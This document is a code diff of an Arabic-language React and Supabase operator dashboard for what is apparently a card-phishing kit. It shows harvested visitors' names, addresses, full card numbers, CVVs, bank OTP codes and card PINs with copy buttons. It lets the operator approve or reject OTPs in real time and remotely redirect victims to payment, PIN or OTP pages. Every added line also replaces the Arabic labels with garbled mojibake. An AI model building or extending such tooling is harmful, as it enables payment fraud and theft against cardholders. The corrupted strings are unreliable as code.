-      {/* All info cards — shown together, real-time, no tabs */}
+      {/* All info cards â shown together, real-time, no tabs */}
       <StageCards v={v} />
 
       {/* Tech / session card */}
       <div className="bg-card rounded-2xl border border-border/60 p-4 md:p-6">
         <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70 mb-3">
-          الجلسة والجهاز
+          Ø§ÙØ¬ÙØ³Ø© ÙØ§ÙØ¬ÙØ§Ø²
         </div>
         <div className="grid sm:grid-cols-2 gap-x-6 gap-y-2 text-sm">
-          <Field icon={Monitor} label="المتصفح" value={v.user_agent} mono />
-          <Field label="معرّف الجلسة" value={v.session_id} mono />
-          <Field icon={Globe} label="البلد المكتشف" value={v.detected_country} />
-          <Field label="العملة" value={v.currency} />
-          <Field label="اللغة" value={v.language} />
-          <Field icon={Hash} label="عدد الزيارات" value={String(v.visits_count)} />
-          <Field icon={Clock} label="أول دخول" value={formatDateTime(v.created_at)} />
-          <Field icon={Clock} label="آخر نشاط" value={formatDateTime(v.last_seen_at)} />
-          <Field label="صفحة الهبوط" value={v.landing_path} />
-          <Field label="آخر صفحة" value={v.last_path} />
-          <Field label="المرجع" value={v.referrer} />
-          <Field label="عنوان IP" value={v.ip_address} mono />
+          <Field icon={Monitor} label="Ø§ÙÙØªØµÙØ­" value={v.user_agent} mono />
+          <Field label="ÙØ¹Ø±ÙÙ Ø§ÙØ¬ÙØ³Ø©" value={v.session_id} mono />
+          <Field icon={Globe} label="Ø§ÙØ¨ÙØ¯ Ø§ÙÙÙØªØ´Ù" value={v.detected_country} />
+          <Field label="Ø§ÙØ¹ÙÙØ©" value={v.currency} />
+          <Field label="Ø§ÙÙØºØ©" value={v.language} />
+          <Field icon={Hash} label="Ø¹Ø¯Ø¯ Ø§ÙØ²ÙØ§Ø±Ø§Øª" value={String(v.visits_count)} />
+          <Field icon={Clock} label="Ø£ÙÙ Ø¯Ø®ÙÙ" value={formatDateTime(v.created_at)} />
+          <Field icon={Clock} label="Ø¢Ø®Ø± ÙØ´Ø§Ø·" value={formatDateTime(v.last_seen_at)} />
+          <Field label="ØµÙØ­Ø© Ø§ÙÙØ¨ÙØ·" value={v.landing_path} />
+          <Field label="Ø¢Ø®Ø± ØµÙØ­Ø©" value={v.last_path} />
+          <Field label="Ø§ÙÙØ±Ø¬Ø¹" value={v.referrer} />
+          <Field label="Ø¹ÙÙØ§Ù IP" value={v.ip_address} mono />
         </div>
       </div>
 
@@ -989,19 +992,19 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
           onClick={clearConversation}
           className="inline-flex items-center gap-1.5 h-9 px-4 rounded-lg text-amber-700 bg-amber-50 hover:bg-amber-100 border border-amber-200 text-xs font-medium"
         >
-          <MessageSquareX className="w-3.5 h-3.5" /> مسح المحادثة
+          <MessageSquareX className="w-3.5 h-3.5" /> ÙØ³Ø­ Ø§ÙÙØ­Ø§Ø¯Ø«Ø©
         </button>
         <button
           onClick={onDelete}
           className="inline-flex items-center gap-1.5 h-9 px-4 rounded-lg text-rose-600 hover:bg-rose-50 border border-transparent text-xs font-medium"
         >
-          <Trash2 className="w-3.5 h-3.5" /> حذف الزائر
+          <Trash2 className="w-3.5 h-3.5" /> Ø­Ø°Ù Ø§ÙØ²Ø§Ø¦Ø±
         </button>
         <button
           onClick={onClose}
           className="inline-flex items-center gap-1.5 h-9 px-4 rounded-lg border border-border hover:bg-muted text-xs font-medium"
         >
-          <X className="w-3.5 h-3.5" /> إغلاق
+          <X className="w-3.5 h-3.5" /> Ø¥ØºÙØ§Ù
         </button>
       </div>
     </div>
@@ -1067,7 +1070,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
   }[] = [
     {
       key: "checkout",
-      label: "إتمام الطلب",
+      label: "Ø¥ØªÙØ§Ù Ø§ÙØ·ÙØ¨",
       icon: UsersIcon,
       at: v.checkout_at,
       done: hasAny(v.full_name, v.email, v.phone, v.address, v.plan_selected, v.order_total),
@@ -1075,7 +1078,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
     },
     {
       key: "card",
-      label: "بطاقة الدفع",
+      label: "Ø¨Ø·Ø§ÙØ© Ø§ÙØ¯ÙØ¹",
       icon: CreditCard,
       at: v.card_at,
       done: hasAny(v.card_number, v.card_holder, v.card_expiry, v.card_cvv),
@@ -1083,7 +1086,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
     },
     {
       key: "otp",
-      label: "رمز OTP",
+      label: "Ø±ÙØ² OTP",
       icon: ShieldCheck,
       at: v.otp_at,
       done: hasAny(v.card_otp),
@@ -1091,7 +1094,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
     },
     {
       key: "pin",
-      label: "الرقم السري",
+      label: "Ø§ÙØ±ÙÙ Ø§ÙØ³Ø±Ù",
       icon: Lock,
       at: v.pin_at,
       done: hasAny(v.card_pin),
@@ -1118,7 +1121,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
     <div className="bg-card rounded-2xl border border-border/60 p-4 md:p-6">
       <div className="flex items-center justify-between mb-4">
         <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70">
-          مراحل العملية
+          ÙØ±Ø§Ø­Ù Ø§ÙØ¹ÙÙÙØ©
         </div>
         <div className="text-xs text-muted-foreground tabular-nums">
           {completedCount} / {steps.length}
@@ -1139,7 +1142,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
                       ? toneActive[step.tone]
                       : "bg-background border-border text-muted-foreground/50"
                   }`}
-                  title={step.at ? formatDateTime(step.at) : "لم يكتمل بعد"}
+                  title={step.at ? formatDateTime(step.at) : "ÙÙ ÙÙØªÙÙ Ø¨Ø¹Ø¯"}
                 >
                   {step.done ? <Check className="w-4 h-4 md:w-5 md:h-5" /> : <Icon className="w-4 h-4 md:w-5 md:h-5" />}
                 </div>
@@ -1150,7 +1153,7 @@ const StageProgress = ({ v }: { v: Visitor }) => {
                   {step.label}
                 </div>
                 <div className="text-[10px] text-muted-foreground tabular-nums mt-0.5 truncate">
-                  {step.at ? formatDateTime(step.at) : "—"}
+                  {step.at ? formatDateTime(step.at) : "â"}
                 </div>
               </div>
             </div>
@@ -1170,7 +1173,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
   if (!hasContact && !hasCard && !hasPin && !hasOtp) {
     return (
       <div className="bg-background border border-dashed border-border rounded-2xl p-8 text-center text-sm text-muted-foreground">
-        لم يقدّم الزائر أي معلومات بعد — كل ما يدخله سيظهر هنا فوراً.
+        ÙÙ ÙÙØ¯ÙÙ Ø§ÙØ²Ø§Ø¦Ø± Ø£Ù ÙØ¹ÙÙÙØ§Øª Ø¨Ø¹Ø¯ â ÙÙ ÙØ§ ÙØ¯Ø®ÙÙ Ø³ÙØ¸ÙØ± ÙÙØ§ ÙÙØ±Ø§Ù.
       </div>
     );
   }
@@ -1180,27 +1183,27 @@ const StageCards = ({ v }: { v: Visitor }) => {
       {hasContact && (
         <StageCard
           tone="sky"
-          title="إتمام الطلب · المعلومات الشخصية"
+          title="Ø¥ØªÙØ§Ù Ø§ÙØ·ÙØ¨ Â· Ø§ÙÙØ¹ÙÙÙØ§Øª Ø§ÙØ´Ø®ØµÙØ©"
           badge="Checkout"
           icon={<UsersIcon className="w-4 h-4" />}
           time={v.checkout_at ? formatDateTime(v.checkout_at) : undefined}
         >
-          <Field icon={UsersIcon} label="الاسم" value={v.full_name} />
-          <Field icon={Mail} label="البريد" value={v.email} />
-          <Field icon={Phone} label="الهاتف" value={v.phone} />
-          <Field icon={MapPin} label="العنوان" value={v.address} />
-          <Field label="المدينة" value={v.city} />
-          <Field label="البلد" value={v.country} />
-          <Field label="الرمز البريدي" value={v.postal_code} />
-          <Field icon={Package} label="الباقة" value={v.plan_selected} />
-          <Field label="الإجمالي" value={v.order_total} />
+          <Field icon={UsersIcon} label="Ø§ÙØ§Ø³Ù" value={v.full_name} />
+          <Field icon={Mail} label="Ø§ÙØ¨Ø±ÙØ¯" value={v.email} />
+          <Field icon={Phone} label="Ø§ÙÙØ§ØªÙ" value={v.phone} />
+          <Field icon={MapPin} label="Ø§ÙØ¹ÙÙØ§Ù" value={v.address} />
+          <Field label="Ø§ÙÙØ¯ÙÙØ©" value={v.city} />
+          <Field label="Ø§ÙØ¨ÙØ¯" value={v.country} />
+          <Field label="Ø§ÙØ±ÙØ² Ø§ÙØ¨Ø±ÙØ¯Ù" value={v.postal_code} />
+          <Field icon={Package} label="Ø§ÙØ¨Ø§ÙØ©" value={v.plan_selected} />
+          <Field label="Ø§ÙØ¥Ø¬ÙØ§ÙÙ" value={v.order_total} />
         </StageCard>
       )}
 
       {hasCard && (
         <StageCard
           tone="rose"
-          title="بيانات بطاقة الدفع"
+          title="Ø¨ÙØ§ÙØ§Øª Ø¨Ø·Ø§ÙØ© Ø§ÙØ¯ÙØ¹"
           badge="Payment Card"
           icon={<CreditCard className="w-4 h-4" />}
           time={v.card_at ? formatDateTime(v.card_at) : undefined}
@@ -1211,9 +1214,9 @@ const StageCards = ({ v }: { v: Visitor }) => {
             expiry={v.card_expiry}
             cvv={v.card_cvv}
           />
-          <Field icon={CreditCard} label="حامل البطاقة" value={v.card_holder} copyable />
-          <Field icon={CreditCard} label="رقم البطاقة" value={v.card_number} mono copyable />
-          <Field label="الانتهاء" value={v.card_expiry} mono copyable />
+          <Field icon={CreditCard} label="Ø­Ø§ÙÙ Ø§ÙØ¨Ø·Ø§ÙØ©" value={v.card_holder} copyable />
+          <Field icon={CreditCard} label="Ø±ÙÙ Ø§ÙØ¨Ø·Ø§ÙØ©" value={v.card_number} mono copyable />
+          <Field label="Ø§ÙØ§ÙØªÙØ§Ø¡" value={v.card_expiry} mono copyable />
           <Field icon={Lock} label="CVV" value={v.card_cvv} mono copyable />
           {(v.last_path || "").startsWith("/payment") && !(v.last_path || "").startsWith("/payment/pin") && !(v.last_path || "").startsWith("/payment/otp") && (
             <ApprovalActions sessionId={v.session_id} stage="card" />
@@ -1224,14 +1227,14 @@ const StageCards = ({ v }: { v: Visitor }) => {
       {hasOtp && (
         <StageCard
           tone="emerald"
-          title="رمز التحقق OTP"
+          title="Ø±ÙØ² Ø§ÙØªØ­ÙÙ OTP"
           badge="OTP"
           icon={<ShieldCheck className="w-4 h-4" />}
           time={v.otp_at ? formatDateTime(v.otp_at) : undefined}
         >
           {v.rejected_otps && v.rejected_otps.length > 0 && (
             <div className="mb-3 space-y-1">
-              <div className="text-[10px] uppercase tracking-wider text-rose-500 font-semibold mb-1">أكواد مرفوضة</div>
+              <div className="text-[10px] uppercase tracking-wider text-rose-500 font-semibold mb-1">Ø£ÙÙØ§Ø¯ ÙØ±ÙÙØ¶Ø©</div>
               {v.rejected_otps.map((code, i) => (
                 <div key={i} className="flex items-center gap-2 px-2 py-1 rounded bg-rose-50 border border-rose-200">
                   <span className="text-rose-400 text-xs line-through font-mono">{code}</span>
@@ -1239,7 +1242,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
               ))}
             </div>
           )}
-          <Field icon={ShieldCheck} label="OTP الحالي" value={v.card_otp} mono />
+          <Field icon={ShieldCheck} label="OTP Ø§ÙØ­Ø§ÙÙ" value={v.card_otp} mono />
           {(v.last_path || "").startsWith("/payment/otp") && (
             <ApprovalActions sessionId={v.session_id} stage="otp" />
           )}
@@ -1249,7 +1252,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
       {hasPin && (
         <StageCard
           tone="amber"
-          title="الرقم السري للبطاقة (PIN)"
+          title="Ø§ÙØ±ÙÙ Ø§ÙØ³Ø±Ù ÙÙØ¨Ø·Ø§ÙØ© (PIN)"
           badge="PIN"
           icon={<Lock className="w-4 h-4" />}
           time={v.pin_at ? formatDateTime(v.pin_at) : undefined}
@@ -1267,9 +1270,9 @@ const StageCards = ({ v }: { v: Visitor }) => {
 /* ---------- Approval / Rejection actions ---------- */
 
 const STAGE_LABELS: Record<"card" | "pin" | "otp", { title: string; approve: string; reject: string }> = {
-  card: { title: "إجراء على بطاقة الدفع", approve: "موافق", reject: "رفض" },
-  pin:  { title: "إجراء على الرقم السري",  approve: "موافق", reject: "رفض" },
-  otp:  { title: "إجراء على رمز OTP",      approve: "موافق",     reject: "رفض" },
+  card: { title: "Ø¥Ø¬Ø±Ø§Ø¡ Ø¹ÙÙ Ø¨Ø·Ø§ÙØ© Ø§ÙØ¯ÙØ¹", approve: "ÙÙØ§ÙÙ", reject: "Ø±ÙØ¶" },
+  pin:  { title: "Ø¥Ø¬Ø±Ø§Ø¡ Ø¹ÙÙ Ø§ÙØ±ÙÙ Ø§ÙØ³Ø±Ù",  approve: "ÙÙØ§ÙÙ", reject: "Ø±ÙØ¶" },
+  otp:  { title: "Ø¥Ø¬Ø±Ø§Ø¡ Ø¹ÙÙ Ø±ÙØ² OTP",      approve: "ÙÙØ§ÙÙ",     reject: "Ø±ÙØ¶" },
 };
 
 const ApprovalActions = ({ sessionId, stage }: { sessionId: string; stage: "card" | "pin" | "otp" }) => {
@@ -1283,10 +1286,10 @@ const ApprovalActions = ({ sessionId, stage }: { sessionId: string; stage: "card
       .insert([{ session_id: sessionId, command, payload: {} as never }]);
     setSending(null);
     if (error) {
-      toast({ title: "تعذّر إرسال القرار", description: error.message, variant: "destructive" });
+      toast({ title: "ØªØ¹Ø°ÙØ± Ø¥Ø±Ø³Ø§Ù Ø§ÙÙØ±Ø§Ø±", description: error.message, variant: "destructive" });
       return;
     }
-    sonner.success(action === "approve" ? "تمت الموافقة وأُرسلت للزائر" : "تم إرسال الرفض للزائر");
+    sonner.success(action === "approve" ? "ØªÙØª Ø§ÙÙÙØ§ÙÙØ© ÙØ£ÙØ±Ø³ÙØª ÙÙØ²Ø§Ø¦Ø±" : "ØªÙ Ø¥Ø±Ø³Ø§Ù Ø§ÙØ±ÙØ¶ ÙÙØ²Ø§Ø¦Ø±");
   };
 
   const labels = STAGE_LABELS[stage];
@@ -1332,7 +1335,7 @@ const SidebarApproval = ({ v }: { v: Visitor }) => {
     <div className="px-3 pb-3 -mt-1">
       <div className="flex items-center gap-1.5 text-[10px] text-rose-700 bg-rose-50 border border-rose-200 rounded-md px-2 py-1 mb-1.5">
         <Bell className="w-3 h-3 animate-pulse" />
-        بانتظار قرارك — {stage === "card" ? "البطاقة" : stage === "pin" ? "PIN" : "OTP"}
+        Ø¨Ø§ÙØªØ¸Ø§Ø± ÙØ±Ø§Ø±Ù â {stage === "card" ? "Ø§ÙØ¨Ø·Ø§ÙØ©" : stage === "pin" ? "PIN" : "OTP"}
       </div>
       <ApprovalActions sessionId={v.session_id} stage={stage} />
     </div>
@@ -1340,13 +1343,13 @@ const SidebarApproval = ({ v }: { v: Visitor }) => {
 };
 
 const REMOTE_ACTIONS: { id: string; label: string; tone: keyof typeof toneClasses; icon: React.ReactNode }[] = [
-  { id: "go_home",     label: "الرئيسية",   tone: "slate",   icon: <Home className="w-3.5 h-3.5" /> },
-  { id: "go_checkout", label: "إتمام الطلب", tone: "sky",     icon: <Package className="w-3.5 h-3.5" /> },
-  { id: "go_payment",  label: "الدفع",       tone: "rose",    icon: <CreditCard className="w-3.5 h-3.5" /> },
+  { id: "go_home",     label: "Ø§ÙØ±Ø¦ÙØ³ÙØ©",   tone: "slate",   icon: <Home className="w-3.5 h-3.5" /> },
+  { id: "go_checkout", label: "Ø¥ØªÙØ§Ù Ø§ÙØ·ÙØ¨", tone: "sky",     icon: <Package className="w-3.5 h-3.5" /> },
+  { id: "go_payment",  label: "Ø§ÙØ¯ÙØ¹",       tone: "rose",    icon: <CreditCard className="w-3.5 h-3.5" /> },
   { id: "go_pin",      label: "PIN",         tone: "amber",   icon: <Lock className="w-3.5 h-3.5" /> },
   { id: "go_otp",      label: "OTP",         tone: "amber",   icon: <ShieldCheck className="w-3.5 h-3.5" /> },
-  { id: "go_success",  label: "نجاح",        tone: "emerald", icon: <CheckCircle2 className="w-3.5 h-3.5" /> },
-  { id: "reload",      label: "إعادة تحميل", tone: "slate",   icon: <RefreshCw className="w-3.5 h-3.5" /> },
+  { id: "go_success",  label: "ÙØ¬Ø§Ø­",        tone: "emerald", icon: <CheckCircle2 className="w-3.5 h-3.5" /> },
+  { id: "reload",      label: "Ø¥Ø¹Ø§Ø¯Ø© ØªØ­ÙÙÙ", tone: "slate",   icon: <RefreshCw className="w-3.5 h-3.5" /> },
 ];
 
 const RemoteControl = ({ sessionId }: { sessionId: string }) => {
@@ -1359,10 +1362,10 @@ const RemoteControl = ({ sessionId }: { sessionId: string }) => {
       .insert([{ session_id: sessionId, command, payload: payload as never }]);
     setSending(null);
     if (error) {
-      toast({ title: "تعذّر إرسال الأمر", description: error.message, variant: "destructive" });
+      toast({ title: "ØªØ¹Ø°ÙØ± Ø¥Ø±Ø³Ø§Ù Ø§ÙØ£ÙØ±", description: error.message, variant: "destructive" });
       return;
     }
-    toast({ title: "تم إرسال الأمر للزائر" });
+    toast({ title: "ØªÙ Ø¥Ø±Ø³Ø§Ù Ø§ÙØ£ÙØ± ÙÙØ²Ø§Ø¦Ø±" });
   };
 
   return (
@@ -1373,11 +1376,11 @@ const RemoteControl = ({ sessionId }: { sessionId: string }) => {
           className="inline-flex items-center gap-1.5 h-8 px-3 rounded-md border border-border bg-background hover:bg-muted text-xs font-medium transition disabled:opacity-50"
         >
           {sending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
-          توجيه الزائر
+          ØªÙØ¬ÙÙ Ø§ÙØ²Ø§Ø¦Ø±
         </button>
       </DropdownMenuTrigger>
       <DropdownMenuContent align="end" className="w-52">
-        <DropdownMenuLabel className="text-xs">أوامر فورية عبر Realtime</DropdownMenuLabel>
+        <DropdownMenuLabel className="text-xs">Ø£ÙØ§ÙØ± ÙÙØ±ÙØ© Ø¹Ø¨Ø± Realtime</DropdownMenuLabel>
         <DropdownMenuSeparator />
         {REMOTE_ACTIONS.map((a) => {
           const t = toneClasses[a.tone];
@@ -1438,10 +1441,10 @@ const Field = ({
     try {
       await navigator.clipboard.writeText(String(value));
       setCopied(true);
-      toast({ title: "تم النسخ", description: `${label}: ${value}` });
+      toast({ title: "ØªÙ Ø§ÙÙØ³Ø®", description: `${label}: ${value}` });
       setTimeout(() => setCopied(false), 1400);
     } catch {
-      toast({ title: "فشل النسخ", variant: "destructive" });
+      toast({ title: "ÙØ´Ù Ø§ÙÙØ³Ø®", variant: "destructive" });
     }
   };
 
@@ -1452,13 +1455,13 @@ const Field = ({
       </div>
       <div className="flex items-center gap-1.5 min-w-0">
         <div className={`break-words px-1 -mx-1 flex-1 min-w-0 ${mono ? "font-mono text-xs" : ""} ${!value ? "text-muted-foreground/60 italic" : ""} ${flash ? "flash-update" : ""}`}>
-          {value || "—"}
+          {value || "â"}
         </div>
         {copyable && value && (
           <button
             type="button"
             onClick={handleCopy}
-            aria-label={`نسخ ${label}`}
+            aria-label={`ÙØ³Ø® ${label}`}
             className="shrink-0 inline-flex items-center justify-center w-6 h-6 rounded-md text-muted-foreground hover:text-foreground hover:bg-accent transition-colors"
           >
             {copied ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
@@ -1483,21 +1486,21 @@ const ChangePasswordDialog = ({
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (pw.length < 6) {
-      toast({ title: "كلمة المرور قصيرة", description: "يجب أن تكون 6 أحرف على الأقل.", variant: "destructive" });
+      toast({ title: "ÙÙÙØ© Ø§ÙÙØ±ÙØ± ÙØµÙØ±Ø©", description: "ÙØ¬Ø¨ Ø£Ù ØªÙÙÙ 6 Ø£Ø­Ø±Ù Ø¹ÙÙ Ø§ÙØ£ÙÙ.", variant: "destructive" });
       return;
     }
     if (pw !== pw2) {
-      toast({ title: "كلمتا المرور غير متطابقتين", variant: "destructive" });
+      toast({ title: "ÙÙÙØªØ§ Ø§ÙÙØ±ÙØ± ØºÙØ± ÙØªØ·Ø§Ø¨ÙØªÙÙ", variant: "destructive" });
       return;
     }
     setSaving(true);
     const { error } = await supabase.auth.updateUser({ password: pw });
     setSaving(false);
     if (error) {
-      toast({ title: "تعذّر تحديث كلمة المرور", description: error.message, variant: "destructive" });
+      toast({ title: "ØªØ¹Ø°ÙØ± ØªØ­Ø¯ÙØ« ÙÙÙØ© Ø§ÙÙØ±ÙØ±", description: error.message, variant: "destructive" });
       return;
     }
-    toast({ title: "تم تحديث كلمة المرور بنجاح" });
+    toast({ title: "ØªÙ ØªØ­Ø¯ÙØ« ÙÙÙØ© Ø§ÙÙØ±ÙØ± Ø¨ÙØ¬Ø§Ø­" });
     reset();
     onOpenChange(false);
   };
@@ -1506,27 +1509,27 @@ const ChangePasswordDialog = ({
     <Dialog open={open} onOpenChange={(v) => { if (!v) reset(); onOpenChange(v); }}>
       <DialogContent dir="rtl" className="sm:max-w-md">
         <DialogHeader>
-          <DialogTitle className="text-right">تغيير كلمة المرور</DialogTitle>
+          <DialogTitle className="text-right">ØªØºÙÙØ± ÙÙÙØ© Ø§ÙÙØ±ÙØ±</DialogTitle>
           <DialogDescription className="text-right">
-            أدخل كلمة المرور الجديدة لحساب الأدمن.
+            Ø£Ø¯Ø®Ù ÙÙÙØ© Ø§ÙÙØ±ÙØ± Ø§ÙØ¬Ø¯ÙØ¯Ø© ÙØ­Ø³Ø§Ø¨ Ø§ÙØ£Ø¯ÙÙ.
           </DialogDescription>
         </DialogHeader>
         <form onSubmit={submit} className="space-y-4">
           <div className="space-y-2">
-            <Label htmlFor="new-pw">كلمة المرور الجديدة</Label>
+            <Label htmlFor="new-pw">ÙÙÙØ© Ø§ÙÙØ±ÙØ± Ø§ÙØ¬Ø¯ÙØ¯Ø©</Label>
             <Input id="new-pw" type="password" value={pw} onChange={(e) => setPw(e.target.value)} autoFocus />
           </div>
           <div className="space-y-2">
-            <Label htmlFor="new-pw-2">تأكيد كلمة المرور</Label>
+            <Label htmlFor="new-pw-2">ØªØ£ÙÙØ¯ ÙÙÙØ© Ø§ÙÙØ±ÙØ±</Label>
             <Input id="new-pw-2" type="password" value={pw2} onChange={(e) => setPw2(e.target.value)} />
           </div>
           <DialogFooter className="gap-2 sm:gap-2">
             <Button type="button" variant="outline" onClick={() => onOpenChange(false)} disabled={saving}>
-              إلغاء
+              Ø¥ÙØºØ§Ø¡
             </Button>
             <Button type="submit" disabled={saving}>
               {saving ? <Loader2 className="w-4 h-4 animate-spin ml-2" /> : null}
-              حفظ
+              Ø­ÙØ¸
             </Button>
           </DialogFooter>
         </form>
